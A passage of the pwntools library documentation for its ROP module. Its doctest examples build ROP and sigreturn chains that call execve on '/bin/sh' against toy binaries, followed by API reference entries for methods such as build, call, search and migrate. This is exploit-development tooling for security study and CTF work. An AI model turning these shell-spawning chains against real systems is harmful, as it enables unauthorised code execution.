<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;int 0x80</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;binsh: .asciz &quot;/bin/sh&quot;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">binary</span>    <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="n">assembly</span><span class="p">)</span>
</pre></div>
</div>
<p>Let&#8217;s create a ROP object and invoke the call.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">kernel</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span>   <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">binsh</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;binsh&#39;</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="n">binsh</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</pre></div>
</div>
<p>That&#8217;s all there is to it.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">()</span>
<span class="go">0x0000:       0x1000000e pop eax; ret</span>
<span class="go">0x0004:             0x77</span>
<span class="go">0x0008:       0x1000000b int 0x80</span>
<span class="go">0x000c:              0x0 gs</span>
<span class="go">0x0010:              0x0 fs</span>
<span class="go">0x0014:              0x0 es</span>
<span class="go">0x0018:              0x0 ds</span>
<span class="go">0x001c:              0x0 edi</span>
<span class="go">0x0020:              0x0 esi</span>
<span class="go">0x0024:              0x0 ebp</span>
<span class="go">0x0028:              0x0 esp</span>
<span class="go">0x002c:       0x10000012 ebx = binsh</span>
<span class="go">0x0030:              0x0 edx</span>
<span class="go">0x0034:              0x0 ecx</span>
<span class="go">0x0038:              0xb eax</span>
<span class="go">0x003c:              0x0 trapno</span>
<span class="go">0x0040:              0x0 err</span>
<span class="go">0x0044:       0x1000000b int 0x80</span>
<span class="go">0x0048:             0x23 cs</span>
<span class="go">0x004c:              0x0 eflags</span>
<span class="go">0x0050:              0x0 esp_at_signal</span>
<span class="go">0x0054:             0x2b ss</span>
<span class="go">0x0058:              0x0 fpstate</span>
</pre></div>
</div>
<p>Let&#8217;s try it out!</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;echo hello; exit&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;hello\n&#39;</span>
</pre></div>
</div>
<dl class="class">
<dt id="pwnlib.rop.rop.ROP">
<em class="property">class </em><code class="descclassname">pwnlib.rop.rop.</code><code class="descname">ROP</code><span class="sig-paren">(</span><em>elfs</em>, <em>base=None</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP" title="Permalink to this definition">¶</a></dt>
<dd><p>Class which simplifies the generation of ROP-chains.</p>
<p>Example:</p>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;ropasaurusrex&#39;</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x80</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">()</span>
<span class="c1"># [&#39;0x0000:        0x80482fc (read)&#39;,</span>
<span class="c1">#  &#39;0x0004:       0xdeadbeef&#39;,</span>
<span class="c1">#  &#39;0x0008:              0x0&#39;,</span>
<span class="c1">#  &#39;0x000c:        0x80496a8&#39;]</span>
<span class="nb">str</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
<span class="c1"># &#39;\xfc\x82\x04\x08\xef\xbe\xad\xde\x00\x00\x00\x00\xa8\x96\x04\x08&#39;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&quot;i386&quot;</span><span class="p">,</span> <span class="n">kernel</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">=</span> <span class="s1">&#39;int 0x80; ret; add esp, 0x10; ret; pop eax; ret&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="n">assembly</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;funcname&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1234</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span><span class="o">.</span><span class="n">funcname</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span><span class="o">.</span><span class="n">funcname</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">r</span><span class="o">.</span><span class="n">dump</span><span class="p">()</span>
<span class="go">0x0000:       0x10001234 funcname(1, 2)</span>
<span class="go">0x0004:       0x10000003 &lt;adjust: add esp, 0x10; ret&gt;</span>
<span class="go">0x0008:              0x1 arg0</span>
<span class="go">0x000c:              0x2 arg1</span>
<span class="go">0x0010:           &#39;eaaa&#39; &lt;pad&gt;</span>
<span class="go">0x0014:           &#39;faaa&#39; &lt;pad&gt;</span>
<span class="go">0x0018:       0x10001234 funcname(3)</span>
<span class="go">0x001c:       0x10000007 &lt;adjust: pop eax; ret&gt;</span>
<span class="go">0x0020:              0x3 arg0</span>
<span class="go">0x0024:       0x10000007 pop eax; ret</span>
<span class="go">0x0028:             0x77</span>
<span class="go">0x002c:       0x10000000 int 0x80</span>
<span class="go">0x0030:              0x0 gs</span>
<span class="go">0x0034:              0x0 fs</span>
<span class="go">0x0038:              0x0 es</span>
<span class="go">0x003c:              0x0 ds</span>
<span class="go">0x0040:              0x0 edi</span>
<span class="go">0x0044:              0x0 esi</span>
<span class="go">0x0048:              0x0 ebp</span>
<span class="go">0x004c:              0x0 esp</span>
<span class="go">0x0050:              0x4 ebx</span>
<span class="go">0x0054:              0x6 edx</span>
<span class="go">0x0058:              0x5 ecx</span>
<span class="go">0x005c:              0xb eax</span>
<span class="go">0x0060:              0x0 trapno</span>
<span class="go">0x0064:              0x0 err</span>
<span class="go">0x0068:       0x10000000 int 0x80</span>
<span class="go">0x006c:             0x23 cs</span>
<span class="go">0x0070:              0x0 eflags</span>
<span class="go">0x0074:              0x0 esp_at_signal</span>
<span class="go">0x0078:             0x2b ss</span>
<span class="go">0x007c:              0x0 fpstate</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">r</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="mh">0x8048000</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span><span class="o">.</span><span class="n">funcname</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span><span class="o">.</span><span class="n">funcname</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">r</span><span class="o">.</span><span class="n">dump</span><span class="p">()</span>
<span class="go">0x8048000:       0x10001234 funcname(1, 2)</span>
<span class="go">0x8048004:       0x10000003 &lt;adjust: add esp, 0x10; ret&gt;</span>
<span class="go">0x8048008:              0x1 arg0</span>
<span class="go">0x804800c:              0x2 arg1</span>
<span class="go">0x8048010:           &#39;eaaa&#39; &lt;pad&gt;</span>
<span class="go">0x8048014:           &#39;faaa&#39; &lt;pad&gt;</span>
<span class="go">0x8048018:       0x10001234 funcname(3)</span>
<span class="go">0x804801c:       0x10000007 &lt;adjust: pop eax; ret&gt;</span>
<span class="go">0x8048020:              0x3 arg0</span>
<span class="go">0x8048024:       0x10000007 pop eax; ret</span>
<span class="go">0x8048028:             0x77</span>
<span class="go">0x804802c:       0x10000000 int 0x80</span>
<span class="go">0x8048030:              0x0 gs</span>
<span class="go">0x8048034:              0x0 fs</span>
<span class="go">0x8048038:              0x0 es</span>
<span class="go">0x804803c:              0x0 ds</span>
<span class="go">0x8048040:              0x0 edi</span>
<span class="go">0x8048044:              0x0 esi</span>
<span class="go">0x8048048:              0x0 ebp</span>
<span class="go">0x804804c:        0x8048080 esp</span>
<span class="go">0x8048050:              0x4 ebx</span>
<span class="go">0x8048054:              0x6 edx</span>
<span class="go">0x8048058:              0x5 ecx</span>
<span class="go">0x804805c:              0xb eax</span>
<span class="go">0x8048060:              0x0 trapno</span>
<span class="go">0x8048064:              0x0 err</span>
<span class="go">0x8048068:       0x10000000 int 0x80</span>
<span class="go">0x804806c:             0x23 cs</span>
<span class="go">0x8048070:              0x0 eflags</span>
<span class="go">0x8048074:              0x0 esp_at_signal</span>
<span class="go">0x8048078:             0x2b ss</span>
<span class="go">0x804807c:              0x0 fpstate</span>
</pre></div>
</div>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>elfs</strong> (<a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; List of <a class="reference internal" href="index.html#pwnlib.elf.elf.ELF" title="pwnlib.elf.elf.ELF"><code class="xref py py-class docutils literal"><span class="pre">ELF</span></code></a> objects for mining</td>
</tr>
</tbody>
</table>
<dl class="method">
<dt id="pwnlib.rop.rop.ROP.build">
<code class="descname">build</code><span class="sig-paren">(</span><em>base=None</em>, <em>description=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py#L506-672"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP.build" title="Permalink to this definition">¶</a></dt>
<dd><p>Construct the ROP chain into a list of elements which can be passed
to <a class="reference internal" href="index.html#pwnlib.util.packing.flat" title="pwnlib.util.packing.flat"><code class="xref py py-func docutils literal"><span class="pre">flat()</span></code></a>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>base</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The base address to build the rop-chain from. Defaults to
<a class="reference internal" href="#pwnlib.rop.rop.ROP.base" title="pwnlib.rop.rop.ROP.base"><code class="xref py py-attr docutils literal"><span class="pre">base</span></code></a>.</li>
<li><strong>description</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Optional output argument, which will gets a mapping of
<code class="docutils literal"><span class="pre">address:</span> <span class="pre">description</span></code> for each address on the stack,
starting at <code class="docutils literal"><span class="pre">base</span></code>.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.rop.rop.ROP.call">
<code class="descname">call</code><span class="sig-paren">(</span><em>resolvable</em>, <em>arguments=()</em>, <em>abi=None</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py#L697-725"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP.call" title="Permalink to this definition">¶</a></dt>
<dd><p>Add a call to the ROP chain</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>resolvable</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em>,</em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Value which can be looked up via &#8216;resolve&#8217;,
or is already an integer.</li>
<li><strong>arguments</strong> (<a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; List of arguments which can be passed to pack().
Alternately, if a base address is set, arbitrarily nested
structures of strings or integers can be provided.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.rop.rop.ROP.chain">
<code class="descname">chain</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py#L678-684"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP.chain" title="Permalink to this definition">¶</a></dt>
<dd><p>Build the ROP chain</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">str containing raw ROP bytes</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.rop.rop.ROP.describe">
<code class="descname">describe</code><span class="sig-paren">(</span><em>object</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py#L493-504"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP.describe" title="Permalink to this definition">¶</a></dt>
<dd><p>Return a description for an object in the ROP stack</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.rop.rop.ROP.dump">
<code class="descname">dump</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py#L686-688"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP.dump" title="Permalink to this definition">¶</a></dt>
<dd><p>Dump the ROP chain in an easy-to-read manner</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.rop.rop.ROP.find_gadget">
<code class="descname">find_gadget</code><span class="sig-paren">(</span><em>instructions</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py#L780-788"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP.find_gadget" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns a gadget with the exact sequence of instructions specified
in the <code class="docutils literal"><span class="pre">instructions</span></code> argument.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.rop.rop.ROP.generatePadding">
<code class="descname">generatePadding</code><span class="sig-paren">(</span><em>offset</em>, <em>count</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py#L475-491"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP.generatePadding" title="Permalink to this definition">¶</a></dt>
<dd><p>Generates padding to be inserted into the ROP stack.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">([])</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">val</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">generatePadding</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">15</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">cyclic_find</span><span class="p">(</span><span class="n">val</span><span class="p">[:</span><span class="mi">4</span><span class="p">])</span>
<span class="go">5</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">len</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
<span class="go">15</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span><span class="o">.</span><span class="n">generatePadding</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<span class="go">&#39;&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.rop.rop.ROP.migrate">
<code class="descname">migrate</code><span class="sig-paren">(</span><em>next_base</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py#L816-832"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP.migrate" title="Permalink to this definition">¶</a></dt>
<dd><p>Explicitly set $sp, by using a <code class="docutils literal"><span class="pre">leave;</span> <span class="pre">ret</span></code> gadget</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.rop.rop.ROP.raw">
<code class="descname">raw</code><span class="sig-paren">(</span><em>value</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py#L791-814"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP.raw" title="Permalink to this definition">¶</a></dt>
<dd><p>Adds a raw integer or string to the ROP chain.</p>
<p>If your architecture requires aligned values, then make
sure that any given string is aligned!</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<em>int/str</em>) &#8211; The raw value to put onto the rop chain.</td>
</tr>
</tbody>
</table>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">([])</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;AAAAAAAA&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;BBBBBBBB&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;CCCCCCCC&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">()</span>
<span class="go">0x0000:           &#39;AAAA&#39; &#39;AAAAAAAA&#39;</span>
<span class="go">0x0004:           &#39;AAAA&#39;</span>
<span class="go">0x0008:           &#39;BBBB&#39; &#39;BBBBBBBB&#39;</span>
<span class="go">0x000c:           &#39;BBBB&#39;</span>
<span class="go">0x0010:           &#39;CCCC&#39; &#39;CCCCCCCC&#39;</span>
<span class="go">0x0014:           &#39;CCCC&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.rop.rop.ROP.resolve">
<code class="descname">resolve</code><span class="sig-paren">(</span><em>resolvable</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py#L437-452"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP.resolve" title="Permalink to this definition">¶</a></dt>
<dd><p>Resolves a symbol to an address</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>resolvable</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em>,</em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Thing to convert into an address</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">int containing address of &#8216;resolvable&#8217;, or None</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.rop.rop.ROP.search">
<code class="descname">search</code><span class="sig-paren">(</span><em>move=0</em>, <em>regs=None</em>, <em>order='size'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py#L1006-1046"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP.search" title="Permalink to this definition">¶</a></dt>
<dd><p>Search for a gadget which matches the specified criteria.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>move</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Minimum number of bytes by which the stack
pointer is adjusted.</li>
<li><strong>regs</strong> (<a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; Minimum list of registers which are popped off the
stack.</li>
<li><strong>order</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Either the string &#8216;size&#8217; or &#8216;regs&#8217;. Decides how to
order multiple gadgets the fulfill the requirements.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p>The search will try to minimize the number of bytes popped more than
requested, the number of registers touched besides the requested and
the address.</p>
<p>If <code class="docutils literal"><span class="pre">order</span> <span class="pre">==</span> <span class="pre">'size'</span></code>, then gadgets are compared lexicographically
by <code class="docutils literal"><span class="pre">(total_moves,</span> <span class="pre">total_regs,</span> <span class="pre">addr)</span></code>, otherwise by <code class="docutils literal"><span class="pre">(total_regs,</span> <span class="pre">total_moves,</span> <span class="pre">addr)</span></code>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">A <code class="xref py py-class docutils literal"><span class="pre">Gadget</span></code> object</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.rop.rop.ROP.search_iter">
<code class="descname">search_iter</code><span class="sig-paren">(</span><em>move=None</em>, <em>regs=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py#L992-1004"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP.search_iter" title="Permalink to this definition">¶</a></dt>
<dd><p>Iterate through all gadgets which move the stack pointer by
<em>at least</em> <code class="docutils literal"><span class="pre">move</span></code> bytes, and which allow you to set all
registers in <code class="docutils literal"><span class="pre">regs</span></code>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.rop.rop.ROP.setRegisters">
<code class="descname">setRegisters</code><span class="sig-paren">(</span><em>registers</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py#L416-435"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP.setRegisters" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns an OrderedDict of addresses/values which will set the specified
register context.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>registers</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Dictionary of <code class="docutils literal"><span class="pre">{register</span> <span class="pre">name:</span> <span class="pre">value}</span></code></td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">An OrderedDict of <code class="docutils literal"><span class="pre">{register</span> <span class="pre">--</span> <span class="pre">sequence</span> <span class="pre">of</span> <span class="pre">gadgets,</span> <span class="pre">values,</span> <span class="pre">etc.}</span></code>.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.rop.rop.ROP.unresolve">
<code class="descname">unresolve</code><span class="sig-paren">(</span><em>value</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py#L454-473"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP.unresolve" title="Permalink to this definition">¶</a></dt>
<dd><p>Inverts &#8216;resolve&#8217;.  Given an address, it attempts to find a symbol
for it in the loaded ELF files.  If none is found, it searches all
known gadgets, and returns the disassembly</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>value</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Address to look up</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">String containing the symbol name for the address, disassembly for a gadget
(if there&#8217;s one at that address), or an empty string.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.rop.rop.ROP.base">
<code class="descname">base</code><em class="property"> = 0</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP.base" title="Permalink to this definition">¶</a></dt>
<dd><p>Stack address where the first byte of the ROP chain lies, if known.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.rop.rop.ROP.elfs">
<code class="descname">elfs</code><em class="property"> = []</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP.elfs" title="Permalink to this definition">¶</a></dt>
<dd><p>List of ELF files which are available for mining gadgets</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.rop.rop.ROP.migrated">
<code class="descname">migrated</code><em class="property"> = False</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/rop.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.rop.ROP.migrated" title="Permalink to this definition">¶</a></dt>
<dd><p>Whether or not the ROP chain directly sets the stack pointer to a value
which is not contiguous</p>
</dd></dl>

</dd></dl>

</div>
</div>
<span id="document-rop/srop"></span><div class="section" id="module-pwnlib.rop.srop">
